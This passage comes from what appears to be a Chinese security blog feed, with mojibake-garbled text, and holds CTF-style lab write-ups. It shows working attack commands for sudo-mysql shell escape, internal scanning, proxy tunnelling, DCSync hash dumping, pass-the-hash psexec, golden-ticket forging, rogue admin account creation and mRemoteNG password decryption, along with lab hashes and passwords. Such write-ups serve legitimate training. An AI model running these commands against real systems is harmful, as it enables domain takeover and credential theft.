title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>linpeaså…ˆæœé›†ä¸€æ³¢<br><img src="/Rxi134_FILE/a032bd1f9d1a0bd6321be5b68870fc12_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! /bin/bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="è·å–flag1"><a href="#è·å–flag1" class="headerlink" title="è·å–flag1"></a>è·å–flag1</h2><p><img src="/Rxi134_FILE/62f6f43f91f8060c23aba72a4cff2be2_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag&#123;60b53231-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒæ—¶ä¸Šçº¿msf<br><img src="/Rxi134_FILE/d0a08cdc13a78ecea6f64d241c7a7d95_MD5.jpeg"></p><h1 id="fscanå†…ç½‘å¤§ä¿å¥"><a href="#fscanå†…ç½‘å¤§ä¿å¥" class="headerlink" title="fscanå†…ç½‘å¤§ä¿å¥"></a>fscanå†…ç½‘å¤§ä¿å¥</h1><p>çœ‹ä¸‹å†…ç½‘ç½‘æ®µï¼Œ172.22.1.0&#x2F;24<br><img src="/Rxi134_FILE/e6204f90bf4c56e834ea7608176988ee_MD5.jpeg"></p><p>ä¼ ä¸ªfscanï¼Œä¸€é”®æ—¥å†…ç½‘<br><img src="/Rxi134_FILE/6135163d1bc1d91b05add6e361da8c0f_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.1.2      is alive(icmp) Target 172.22.1.15     is alive(icmp) Target 172.22.1.21     is alive(icmp) Target 172.22.1.18     is alive[*] Icmp alive hosts len is: 4172.22.1.21:135 open172.22.1.2:135 open172.22.1.18:139 open172.22.1.21:139 open172.22.1.2:139 open172.22.1.18:135 open172.22.1.18:3306 open172.22.1.18:445 open172.22.1.21:445 open172.22.1.2:445 open172.22.1.18:80 open172.22.1.15:80 open172.22.1.15:22 open172.22.1.2:88 open[*] alive ports len is: 14start vulscan[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin[*] NetInfo [*]172.22.1.18   [->]XIAORANG-OA01   [->]172.22.1.18[*] NetInfo [*]172.22.1.2   [->]DC01   [->]172.22.1.2[*] NetInfo [*]172.22.1.21   [->]XIAORANG-WIN7   [->]172.22.1.21[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)[*] WebTitle http://172.22.1.18        code:302 len:0      title:None è·³è½¬url: http://172.22.1.18?m=login[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1å·²å®Œæˆ 14/14[*] æ‰«æç»“æŸ,è€—æ—¶: 11.06878218s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»ç»“ä¸‹æ¥å†…ç½‘æœ‰4å°æœºå­</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.1.2 dc172.22.1.15 æˆ‘172.22.1.21 win2008ï¼Œå¯èƒ½å—åˆ°ms17-010çš„å½±å“172.22.1.18 ä¿¡å‘¼oa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="æ­å»ºsocksä»£ç†"><a href="#æ­å»ºsocksä»£ç†" class="headerlink" title="æ­å»ºsocksä»£ç†"></a>æ­å»ºsocksä»£ç†</h1><p>ä¸Šä¼ ä¸ªewä½œä¸ºå†…ç½‘ä»£ç†ï¼Œæ–¹ä¾¿è®¿é—®oa</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">20000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥æ­£å¸¸è¿æ¥<br><img src="/Rxi134_FILE/93a16a7df364219e72aa7c8660dec2cc_MD5.jpeg"></p><h1 id="æ·»åŠ sessionè·¯ç”±"><a href="#æ·»åŠ sessionè·¯ç”±" class="headerlink" title="æ·»åŠ sessionè·¯ç”±"></a>æ·»åŠ sessionè·¯ç”±</h1><p>æ–¹ä¾¿æŠŠæˆ‘ä»¬çš„msfæµé‡å¸¦å…¥å†…ç½‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-s</span> <span class="token number">172.22</span>.1.0/24run autoroute <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/812867c1e169a922cd715a7ebc5412ac_MD5.jpeg"></p><h1 id="172-22-1-21-XIAORANG-WIN7æ°¸æ’ä¹‹è“"><a href="#172-22-1-21-XIAORANG-WIN7æ°¸æ’ä¹‹è“" class="headerlink" title="172.22.1.21 XIAORANG-WIN7æ°¸æ’ä¹‹è“"></a>172.22.1.21 XIAORANG-WIN7æ°¸æ’ä¹‹è“</h1><p>å…ˆæ‰“ä¸‹poc<br><img src="/Rxi134_FILE/f3ace0e2067cd9eef98aeac432605841_MD5.jpeg"></p><p>å‡†å¤‡æ­£è¿æ‰“æ°¸æ’ä¹‹è“</p><p>ä½†æ˜¯åˆ©ç”¨sessionè·¯ç”±æ— æ³•getshellï¼Œç›®å‰åŸå› ä¸æ˜ï¼Œæ„Ÿè§‰æœ‰å¯èƒ½æ˜¯webæœºæ­£è¿çš„åŸå› ğŸ¤”<br><img src="/Rxi134_FILE/d81a4b13f08ec3a482a79365d96c03de_MD5.jpeg"></p><p>proxychainså°±å¯ä»¥ï¼Œè¿™é‡Œå› ä¸ºewè€æ˜¯æ–­ï¼Œä»£ç†æ¢æˆäº†chisel<br><img src="/Rxi134_FILE/f95ab55548d00842facf4f4a8f80c32d_MD5.jpeg"><br><img src="/Rxi134_FILE/fd696530353cc7ce72132193d783c0b0_MD5.jpeg"></p><p>ä¸è¿‡æˆ‘æ²¡æ‰¾åˆ°flag<br><img src="/Rxi134_FILE/6f49749112f09825c67fa48aa0b41488_MD5.jpeg"></p><p>è€Œä¸”æ— æ³•å¼¹å‡ºshellâ€¦<br><img src="/Rxi134_FILE/4f67bf4c0c360c1006d080e416d576e1_MD5.jpeg"></p><h2 id="åŸŸæ§åŒæ­¥æ»¥ç”¨-mimikatzæŠ“å–"><a href="#åŸŸæ§åŒæ­¥æ»¥ç”¨-mimikatzæŠ“å–" class="headerlink" title="åŸŸæ§åŒæ­¥æ»¥ç”¨+mimikatzæŠ“å–"></a>åŸŸæ§åŒæ­¥æ»¥ç”¨+mimikatzæŠ“å–</h2><p>msfè‡ªå¸¦kiwiæ¨¡å—ï¼Œå’±å°±ä¸ç”¨æ‰‹åŠ¨ä¸Šä¼ äº†ï¼Œå¾ˆæ–¹ä¾¿</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†æ˜¯åªæŠ“å–åˆ°æœºå™¨ç”¨æˆ·çš„NTLMå“ˆå¸Œï¼Œæ²¡å•¥ç”¨<br><img src="/Rxi134_FILE/dc49e620262033bfc1e8c4b8d34e3bcb_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">XIAORANG-WIN7$NTLMï¼š5dbcc8e0fa12e4aa99b7447bfa087add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸è¿‡æˆ‘ä»¬éƒ½æ˜¯SYSTEMç”¨æˆ·äº†ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ DCSyncï¼Œä¼ªé€ æˆ‘ä»¬æ˜¯ä¸€ä¸ªåŸŸæ§å‘å‡ºåŒæ­¥ç”³è¯·ï¼Œä»è€Œè·å–åŸŸç”¨æˆ·å“ˆå¸Œ</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[DC] 'xiaorang.lab' will be the domain[DC] 'DC01.xiaorang.lab' will be the DC server[DC] Exporting domain 'xiaorang.lab'[rpc] Service  : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        5141106    Marcus  e07510a4284b3c97c8e7dee970918c5c        5121107    Charles f6a9881cd5ae709abb4ac9ab87f24617        5121000    DC01$   94c59dda4a0ec229d4b4cf45dba98dbf        5324801104    XIAORANG-OA01$  dc5f050393a7cc83e0518b8015b8b65d        4096500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        5121108    XIAORANG-WIN7$  8b7dea43bed4b560504e925f0f1b5efd        4096<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="172-22-1-2-DC01"><a href="#172-22-1-2-DC01" class="headerlink" title="172.22.1.2 DC01"></a>172.22.1.2 DC01</h1><h2 id="pth-psexecæ‹¿ä¸‹åŸŸæ§"><a href="#pth-psexecæ‹¿ä¸‹åŸŸæ§" class="headerlink" title="pth+psexecæ‹¿ä¸‹åŸŸæ§"></a>pth+psexecæ‹¿ä¸‹åŸŸæ§</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">psexec.exe xiaorang.lab/administrator@172.22.1.2 <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:10cf89a850fb1cdbe6bb432b859164c8 -dc-ip <span class="token number">172.22</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ee9dcfd5a0bc36581cf73b44edbc1ba5_MD5.jpeg"></p><h2 id="è·å–flag3"><a href="#è·å–flag3" class="headerlink" title="è·å–flag3"></a>è·å–flag3</h2><p><img src="/Rxi134_FILE/7981278fa41cc9988280d60ad8cd5c40_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">e8f88d0d43d6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æƒé™ç»´æŒï¼ˆé»„é‡‘ç¥¨æ®ï¼‰"><a href="#æƒé™ç»´æŒï¼ˆé»„é‡‘ç¥¨æ®ï¼‰" class="headerlink" title="æƒé™ç»´æŒï¼ˆé»„é‡‘ç¥¨æ®ï¼‰"></a>æƒé™ç»´æŒï¼ˆé»„é‡‘ç¥¨æ®ï¼‰</h2><p>æˆ‘ä»¬å·²ç»æœ‰krbtgtè´¦æˆ·çš„NT hashï¼Œä»¥æ­¤æ¥åˆ¶ä½œé»„é‡‘ç¥¨æ®å®ç°åŸŸæƒé™ç»´æŒ</p><p>æŸ¥çœ‹åŸŸSID</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\Windows\system32>powershell -c "(Get-ADDomain).DomainSID"BinaryLength AccountDomainSid                         Value------------ ----------------                         -----          24 S-1-5-21-314492864-3856862959-4045974917 S-1-5-21-314492864-385...C:\Windows\system32><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ¶ä½œé»„é‡‘ç¥¨æ®</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python ticketer.py -domain-sid S-1-5-21-314492864-3856862959-4045974917 <span class="token parameter variable">-nthash</span> fb812eea13a18b7fcdb8e6d67ddc205b <span class="token parameter variable">-domain</span> xiaorang.lab administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯¼å…¥ç¥¨æ®</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒæ—¶ç»‘å®šip<br><img src="/Rxi134_FILE/38f28d489d1a44d14227971361df823a_MD5.jpeg"></p><p>ä½†è¿˜æ˜¯æ— æ³•è¿æ¥ï¼ŒåŸå› ä¸æ˜<br><img src="/Rxi134_FILE/a4105ba270dc9575697f63bfb1275284_MD5.jpeg"></p><p>æ„Ÿè§‰æœ‰å¯èƒ½æ˜¯åŸŸç¯å¢ƒçš„é—®é¢˜<br><img src="/Rxi134_FILE/3dcb1bde5b35bbbfa5599aaf9842925a_MD5.jpeg"></p><h1 id="172-22-1-18-XIAORANG-OA01-ä¿¡å‘¼OA"><a href="#172-22-1-18-XIAORANG-OA01-ä¿¡å‘¼OA" class="headerlink" title="172.22.1.18 XIAORANG-OA01 ä¿¡å‘¼OA"></a>172.22.1.18 XIAORANG-OA01 ä¿¡å‘¼OA</h1><h2 id="è·å–flag2"><a href="#è·å–flag2" class="headerlink" title="è·å–flag2"></a>è·å–flag2</h2><p>å…¶å®æœ‰äº†åŸŸç®¡å°±å¯ä»¥ç›´æ¥ç™»å½•äº†<br><img src="/Rxi134_FILE/70fd03a3bec5e8486a1116547faaab91_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">2ce3-4813-87d4-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœºå™¨å¼€äº†rdpï¼Œé¡ºå¸¦æ·»åŠ ä¸ªç®¡ç†å‘˜ç”¨æˆ·</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user hacker 1qaz2wsx /addnet localgroup administrators hacker /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/ff8a5db87663fad5dbe1ec090188b2b0_MD5.jpeg"></p><p>çœ‹äº†wpï¼Œè¦æ˜¯ç¡¬æ‰“å…¶å®ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±ä¸åšäº†</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ul><li>msfæ˜¯å¾ˆæ–¹ä¾¿çš„ä¸œè¥¿</li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>W Easy-Bastion</title>
      <link href="/2024/10/06/W%20Easy-Bastion/"/>
      <url>/2024/10/06/W%20Easy-Bastion/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE  SERVICE      VERSION22/tcp    open   ssh          OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey:|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)25/tcp    closed smtp110/tcp   closed pop3135/tcp   open   msrpc        Microsoft Windows RPC139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open   msrpc        Microsoft Windows RPC49665/tcp open   msrpc        Microsoft Windows RPC49666/tcp open   msrpc        Microsoft Windows RPC49667/tcp open   msrpc        Microsoft Windows RPC49668/tcp open   msrpc        Microsoft Windows RPC49669/tcp open   msrpc        Microsoft Windows RPC49670/tcp open   msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="å…¥ä¾µ-é©»è¶³"><a href="#å…¥ä¾µ-é©»è¶³" class="headerlink" title="å…¥ä¾µ &amp; é©»è¶³"></a>å…¥ä¾µ &amp; é©»è¶³</h1><h2 id="smb-guestç™»å½•ç­–ç•¥"><a href="#smb-guestç™»å½•ç­–ç•¥" class="headerlink" title="smb guestç™»å½•ç­–ç•¥"></a>smb guestç™»å½•ç­–ç•¥</h2><p>å¯¹smbè¿›è¡Œæšä¸¾<br><img src="/Rxi134_FILE/f6c2c7ba974326656f4877f7574b70c3_MD5.jpeg"><br>å¼€å¯äº†guestç™»å½•ç­–ç•¥ï¼Œéšæœºçš„ç”¨æˆ·åéƒ½ä¼šæ˜ å°„ä¸ºguestç”¨æˆ·</p><p><img src="/Rxi134_FILE/2c5baf067163bd972aa8780521eb8dad_MD5.jpeg"></p><h2 id="å‘ç°å¤‡ä»½æ–‡ä»¶å¤¹"><a href="#å‘ç°å¤‡ä»½æ–‡ä»¶å¤¹" class="headerlink" title="å‘ç°å¤‡ä»½æ–‡ä»¶å¤¹"></a>å‘ç°å¤‡ä»½æ–‡ä»¶å¤¹</h2><p>å…¶ä¸­æœ‰ä¸ª note.txt å’Œ æ–‡ä»¶å¤¹ WindowsImageBackup<br><img src="/Rxi134_FILE/41f43da27c87c35f9254b53c56ebc304_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.ç³»ç»Ÿç®¡ç†å‘˜ï¼šè¯·ä¸è¦å°†æ•´ä¸ªå¤‡ä»½æ–‡ä»¶ä¼ è¾“åˆ°æœ¬åœ°ï¼Œåˆ°å­å…¬å¸çš„ VPN å¤ªæ…¢äº†ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="æŒ‚è½½ç£ç›˜"><a href="#æŒ‚è½½ç£ç›˜" class="headerlink" title="æŒ‚è½½ç£ç›˜"></a>æŒ‚è½½ç£ç›˜</h2><p>æœ‰ä¸¤ä¸ªvhdæ–‡ä»¶ï¼Œåˆ†åˆ«è¿›è¡ŒæŒ‚è½½ï¼Œåªæœ‰ä¸€ä¸ªç›˜é‡Œæœ‰ä¸œè¥¿<br><img src="/Rxi134_FILE/51cdaecb2c4cf1eead38021f71ae2d1c_MD5.jpeg"><br><img src="/Rxi134_FILE/f30f207fd53fb255d38e1a450334eb2d_MD5.jpeg"></p><h2 id="è½¬å‚¨-SAM-SYSTEM"><a href="#è½¬å‚¨-SAM-SYSTEM" class="headerlink" title="è½¬å‚¨ SAM &amp; SYSTEM"></a>è½¬å‚¨ SAM &amp; SYSTEM</h2><p>å…ˆçœ‹çœ‹èƒ½ä¸èƒ½æŠŠé»˜è®¤è´¦å¯†æåˆ°æ‰‹<br><img src="/Rxi134_FILE/07dff079d282657e71ddd77fde55300e_MD5.jpeg"><br>åˆ©ç”¨mimikatzè§£å¯†<br><img src="/Rxi134_FILE/3344986976eb459e67d751a265ab16f7_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">RID  : 000001f4 (500)User : Administrator  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0RID  : 000001f5 (501)User : GuestRID  : 000003e8 (1000)User : L4mpje  Hash NTLM: 26112010952d963c8dc4217daec986d9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°å½©è™¹è¡¨æŸ¥ä¸‹<br><img src="/Rxi134_FILE/aabcee57e6af159e13b02acbe1c9f2e8_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">L4mpje:bureaulampje<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="opensshè¿æ¥"><a href="#opensshè¿æ¥" class="headerlink" title="opensshè¿æ¥"></a>opensshè¿æ¥</h2><p>sshç›´æ¥ä¸Šå»äº†<br><img src="/Rxi134_FILE/c2241c837a4a93e6f105d90a9319ad4b_MD5.jpeg"></p><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><h2 id="ä¸Šä¼ winpeas"><a href="#ä¸Šä¼ winpeas" class="headerlink" title="ä¸Šä¼ winpeas"></a>ä¸Šä¼ winpeas</h2><p>ä¸Šä¼  winpeas å…ˆè¿›è¡Œä¸€æ³¢æ”¶é›†ï¼Œå¸¸è§çš„æ”»å‡»å‘é‡éƒ½æ²¡ä»€ä¹ˆå¯ç”¨çš„</p><p>è¿˜æœ‰ä¸€ä¸ªæ”»å‡»å‘é‡æ˜¯å—æ”»å‡»ç¨‹åºï¼Œä½†æ˜¯ç”¨æˆ·æƒé™å¤ªä½äº†ï¼Œè¿åˆ—å‡ºè®¡ç®—æœºå®‰è£…çš„åº”ç”¨ç¨‹åºéƒ½åšä¸åˆ°<br><img src="/Rxi134_FILE/11cb658d90ab733ab4215a72b3211f3a_MD5.jpeg"><br>æˆ‘åªèƒ½æ‰‹åŠ¨å»ç¿»ç¿»Program Filesäº†<br><img src="/Rxi134_FILE/2557f5b7e5b8155f61d1f8ff2bc58439_MD5.jpeg"></p><h2 id="åˆ©ç”¨å—æ”»å‡»è½¯ä»¶-mRemoteNG-CVE-2023-30367-è·å–ç®¡ç†å‘˜å¯†ç "><a href="#åˆ©ç”¨å—æ”»å‡»è½¯ä»¶-mRemoteNG-CVE-2023-30367-è·å–ç®¡ç†å‘˜å¯†ç " class="headerlink" title="åˆ©ç”¨å—æ”»å‡»è½¯ä»¶ mRemoteNG CVE-2023-30367 è·å–ç®¡ç†å‘˜å¯†ç "></a>åˆ©ç”¨å—æ”»å‡»è½¯ä»¶ mRemoteNG CVE-2023-30367 è·å–ç®¡ç†å‘˜å¯†ç </h2><blockquote><p><strong>mRemoteNG</strong> æ˜¯ä¸€ä¸ªå¼€æºã€å¤šåè®®çš„è¿œç¨‹è¿æ¥ç®¡ç†å™¨ï¼Œæ”¯æŒå¤šç§è¿œç¨‹è¿æ¥åè®®ï¼Œå¦‚ RDPï¼ˆè¿œç¨‹æ¡Œé¢ï¼‰ã€VNCã€SSHã€Telnet ç­‰ã€‚å®ƒé€šè¿‡é›†ä¸­åŒ–çš„ç®¡ç†ç•Œé¢ï¼Œå¸®åŠ©ç”¨æˆ·å¿«é€Ÿç»„ç»‡å’Œè®¿é—®å¤šå°æœåŠ¡å™¨æˆ–è®¾å¤‡ã€‚</p></blockquote><p>ä¸‹è½½ä¸‹æ¥çœ‹çœ‹ç‰ˆæœ¬ï¼Œ1.76.11<br><img src="/Rxi134_FILE/c5f4bbc6cfc831119faf18febec1633a_MD5.jpeg"></p><p><img src="/Rxi134_FILE/1bf55d33d97ed8c04969608258385bf8_MD5.jpeg"><br>è¯·æ³¨æ„ï¼Œé…ç½®å¯†ç åŠ å¯†å’Œè¿æ¥æ–‡ä»¶åŠ å¯†æ˜¯ä¸åŒçš„è®¾ç½®ã€‚é…ç½®å¯†ç åŠ å¯†ä»…ç”¨äºåŠ å¯†é…ç½®æ–‡ä»¶ä¸­çš„å¯†ç ï¼Œè€Œè¿æ¥æ–‡ä»¶åŠ å¯†ç”¨äºåŠ å¯†æ•´ä¸ªé…ç½®æ–‡ä»¶æœ¬èº«ã€‚</p><p>æ­¤æ¼æ´é€šè¿‡ä»å†…å­˜ä¸­è½¬å‚¨å·²è§£å¯†çš„é…ç½®æ¥ç»•è¿‡è¿æ¥æ–‡ä»¶åŠ å¯†ã€‚ä½†æ˜¯ä¸åŒ…å«é…ç½®æ–‡ä»¶åŠ å¯†çš„å¯†ç ï¼ˆé»˜è®¤å¯†é’¥Â <code>mR3m</code>Â ï¼‰ï¼Œå¦‚æœå·²è®¾ç½®è‡ªå®šä¹‰é…ç½®å¯†ç åŠ å¯†å¯†é’¥&#x2F;å¯†ç ï¼Œæ”»å‡»è€…ä»å¿…é¡»çŒœæµ‹è‡ªå®šä¹‰å¯†é’¥ã€‚ï¼ˆå‚è§Â <a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file#mremoteng_decryptpy">mremoteng-decrypt.py éƒ¨åˆ†</a>ï¼‰</p><p>ç¡®å®šåŠ å¯†çš„é…ç½®æ–‡ä»¶ä½ç½®</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">l4mpje@BASTION C:\Users\L4mpje>dir c:\ /s /b | find "confCons.xml"                  c:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xmlc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402277353.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402339071.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402379227.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403070644.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403100488.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403220026.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403261268.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403272831.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403433299.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403486580.backup   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/192185e805cf2007aa0070c4db5760ec_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file">S1lkys&#x2F;CVE-2023-30367-mRemoteNG-password-dumper: Original PoC for CVE-2023-30367 (github.com)</a></p><p>è§£å¯†å¦‚ä¸‹<br><img src="/Rxi134_FILE/3dbfa1187e51d551f8073a269d52f1b0_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:thXLHM96BeKL0ER2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/62e546d0998c7bbe4efeed3aff61a5b5_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº-3</title>
      <link href="/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/"/>
      <url>/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/</url>
      
